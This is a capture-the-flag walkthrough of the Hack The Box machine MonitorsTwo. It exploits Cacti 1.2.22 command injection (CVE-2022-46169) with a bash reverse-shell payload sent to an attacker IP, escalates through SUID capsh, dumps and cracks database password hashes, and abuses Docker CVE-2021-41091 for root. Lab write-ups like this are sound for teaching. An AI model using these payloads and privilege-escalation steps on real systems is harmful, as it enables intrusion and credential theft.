---
cover: ../../../../../.gitbook/assets/monitorstwo-htb.jpeg
coverY: 0
---

# MonitorsTwo

## 1. Machine General Information

* **Operative System:** Linux
* **Difficulty**: Easy
* **Keywords**:
  * Docker
  * Containers
  * SUID
  * CVE-2021-41091
  * CVE-2022-46169

## 2. Enumeration

### 2.1 Port Scanning

```
$ sudo nmap -sC -T5 -Pn 10.10.11.211 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 12:17 EST
Nmap scan report for 10.10.11.211
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: Login to Cacti

Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
```

### 2.2 Web Service Enumeration

The web service is running Cacti v1.2.22. This specific version of Cacti has a remote code execution (RCE) vulnerability.

```
$ curl -s http://10.10.11.211/index.php | grep -o "cactiVersion.*;"
cactiVersion='1.2.22';

$ searchsploit cacti 1.2.22
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Cacti v1.2.22 - Remote Command Execution (RCE)                                     | php/webapps/51166.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## 3. Exploitation

### 3.1 Exploiting CVE-2022-46169 vulnerability for Cacti v1.2.22

Cacti v1.2.22 has a RCE vulnerability in the file **remote\_agent.php** in the funcion **poll\_for\_data()** that doesn't sanitize input parameters in **poll\_for\_data()** function.&#x20;

```php
/* 
Code from official Cacti github repo. 'https://github.com/Cacti/cacti'
Only relevant fragments of code extracted for demonstration.
*/
<?php

/*
 * One of the main failures is located in get_nfilter_request_var() function.
 * This function simply returns the variable from the HTTP request 
 * without sanitising or validating input data.
 */
function get_nfilter_request_var($name, $default = '') {
	global $_CACTI_REQUEST;
	if (isset($_CACTI_REQUEST[$name])) {
		return $_CACTI_REQUEST[$name];
	} elseif (isset($_REQUEST[$name])) {
		return $_REQUEST[$name];
	} else {
		return $default;
	}
}

// Unpatched Code 
$local_data_ids = get_nfilter_request_var('local_data_ids');
$host_id        = get_filter_request_var('host_id');
$poller_id      = get_nfilter_request_var('poller_id'); // payload is stored in $poller_id 
$return         = array();
if (function_exists('proc_open')) {
    /* 
     * proc_open() function execute asynchronous system commands. 
     * Since no filtering or sanitising was performed to the poller_id variable, 
     * this variable is being passed directly to the proc_open() function so the only
     * thing someone could do to exploit this function, is simply use a payload like
     * "1; whoami" to execute arbitrary code.
     */
	$cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);
    $output = fgets($pipes[1], 1024);
	$using_proc_function = true;
} else { 
}

```

To exploit the Cacti vulnerability, we need to find first a valid LOCAL\_DATA\_ID and HOST\_ID. We can do this with a simple fuzzing to the next path:

```
/remote_agent.php?action=polldata&local_data_ids[]=$FUZZ$&host_id=$FUZZ$&poller_id=669
```

This fuzzing should be running until we get a response like the next one:

```
[{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
```

To make things easier, i made a script to fuzz and send the payload. The script is `cacti_1.2.22_exploit.py` and can be found in the next github repository:&#x20;

* [https://github.com/mind2hex/HackTheBox/Machines/Linux/MonitorsTwo](https://github.com/mind2hex/HackTheBox/Machines/Linux/MonitorsTwo)

```bash
# TERMINAL 1 starting listener
nc -lvnp 1234  
listening on [any] 1234 ...

# TERMINAL 2 executing script
python3 cacti_1.2.22_exploit.py http://10.10.11.211/ "bash -c 'exec bash -i &>/dev/tcp/<YOUR_IP_HERE>/<YOUR_PORT_HERE> <&1'"
1 6
[!] Sending payload: 669%3Bbash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/<YOUR_IP_HERE>/<YOUR_PORT_HERE%20%3C%261%27

# TERMINAL 1 receiving connection
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.211] 47748
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ 
```

### 3.2 Privilege Escalation inside the container

Using `leanpeas.sh` to enumerate the container.

```bash
# Shell is running inside a container
╔══════════╣ Unexpected in root   
/.dockerenv
/entrypoint.sh

# capsh binary allow us to escalate privileges
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh  # ./capsh --gid=0 --uid=0 --
-rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
```

From the leanpeas enumeration we can tell that the shell is running inside a contanier and we have a interesting binary file called `capsh`. Using the next command, we can escalate privilege inside the container.

```bash
www-data@50bca5e748b0:/sbin$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --

whoami
root
```

### 3.3 Extracting and Cracking Hashes

Reading the content of the `/entrypoint.sh` script, we see some instructions that are being executed in a database called `cacti`.

```bash
cat /entrypoint.sh
-----------------------
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi
-----------------------
```

We can use this information to execute commands inside the database:

```bash
mysql --host=db --user=root --password=root cacti -e "show TABLES;"
...
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
user_auth_group_realm
user_auth_perms
user_auth_realm
user_domains
user_domains_ldap
user_log
...

mysql --host=db --user=root --password=root cacti -e "SELECT username, password FROM user_auth;"
username	password
admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
guest	43e9a4ab75570f5b
marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

Using Hashcat with the `rockyou.txt` dictionary, we can crack the above hashes. After cracking a hash, we can use it to log in via SSH with marcus user:

```bash
$ hashcat -a 0 -m 3200 '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C' /usr/share/wordlists/rockyou.txt  --show
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey

$ ssh marcus@10.10.11.211       
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 27 Sep 2023 10:11:37 PM UTC

  System load:                      0.0
  Usage of /:                       63.0% of 6.73GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        229
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:22a1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ cat user.txt
d9947b0eae40f1554a10eda3b4035f08
```

## 4. Privilege Escalation

### 4.1 Basic Enumeration

The initial login banner tell us that we have mail so we have to inspect `/var/mail/marcus` .

```
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

This file is a clue of what we should do next. If we read carefully, it tell us that this system had some vulnerabilities. One of the vulnerabilities is CVE-2021-41091.

### 4.2 Exploiting CVE-2021-41091 vulnerability

This Moby (Docker Engine) vulnerability, allow unauthenticated users in the machine, execute, read or modify files inside of the directory where container files are stored. (`/var/lib/docker/...xyz/merged/`). This means that if a user inside the container modify a binary to convert it to a SUID binary. then this SUID binary could be used to escalate privileges by other users using the  `/var/lib/docker/...xyz/merged/bin` path.&#x20;

First, we need to locate the directory where container files are stored.

```
marcus@monitorstwo:~$ findmnt
TARGET                                SOURCE     FSTYPE     OPTIONS
/                                     /dev/sda2  ext4       rw,relatime
├─/sys                                sysfs      sysfs      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs securityfs rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs      tmpfs      ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup2    cgroup2    rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/blkio            cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,blkio
│ │ ├─/sys/fs/cgroup/pids             cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,pids
│ │ ├─/sys/fs/cgroup/memory           cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,memory
│ │ ├─/sys/fs/cgroup/rdma             cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,rdma
│ │ ├─/sys/fs/cgroup/perf_event       cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,perf_event
│ │ ├─/sys/fs/cgroup/cpuset           cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,cpuset
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/freezer          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,freezer
│ │ └─/sys/fs/cgroup/devices          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,devices
│ ├─/sys/fs/pstore                    pstore     pstore     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf                       none       bpf        rw,nosuid,nodev,noexec,relatime,mode=700
│ ├─/sys/kernel/debug                 debugfs    debugfs    rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/tracing               tracefs    tracefs    rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/fuse/connections          fusectl    fusectl    rw,nosuid,nodev,noexec,relatime
│ └─/sys/kernel/config                configfs   configfs   rw,nosuid,nodev,noexec,relatime
├─/proc                               proc       proc       rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc          systemd-1  autofs     rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,
├─/dev                                udev       devtmpfs   rw,nosuid,noexec,relatime,size=1966932k,nr_inodes=491733,
│ ├─/dev/pts                          devpts     devpts     rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs      tmpfs      rw,nosuid,nodev
│ ├─/dev/hugepages                    hugetlbfs  hugetlbfs  rw,relatime,pagesize=2M
│ └─/dev/mqueue                       mqueue     mqueue     rw,nosuid,nodev,noexec,relatime
├─/run                                tmpfs      tmpfs      rw,nosuid,nodev,noexec,relatime,size=402612k,mode=755
│ ├─/run/lock                         tmpfs      tmpfs      rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/docker/netns/97be01a456dd    nsfs[net:[4026532571]]
│ │                                              nsfs       rw
│ ├─/run/user/1000                    tmpfs      tmpfs      rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,g
│ └─/run/docker/netns/1648f9f8ef92    nsfs[net:[4026532632]]
│                                                nsfs       rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
marcus@monitorstwo:~$ 
```

Two paths are being used to store container files so we're gonna create a testing file from the container.

<pre class="language-bash"><code class="lang-bash"># CONTAINER: creating a file from root directory
touch /testing

# SSH MARCUS: Listing docker container directory 
marcus@monitorstwo:~$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
bin   dev            etc   lib    media  opt   root  sbin  sys      tmp  var
boot  entrypoint.sh  home  lib64  mnt    proc  run   srv   <a data-footnote-ref href="#user-content-fn-1">testing</a>  usr

# CONTAINER: modifying the binary file to SUID
chmod u+s /bin/bash

# SSH MARCUS: escalating privileges using the SUID binary.
marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/
.bash_history  .cache/        .local/        root.txt       
.bashrc        cacti/         .profile       .ssh/          
bash-5.1# cat /root/root.txt
1ec867772e1fd89d38388f00a75ee04c
bash-5.1# 
</code></pre>

## 5. References

* [Cacti Repository](https://github.com/Cacti/cacti)
* [Mind2hex github repo](https://github.com/mind2hex/HackTheBox/tree/master/Machines/Linux/MonitorsTwo)
* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
* [CVE-2021-41091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41091)
* [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

[^1]: Here is the testing file
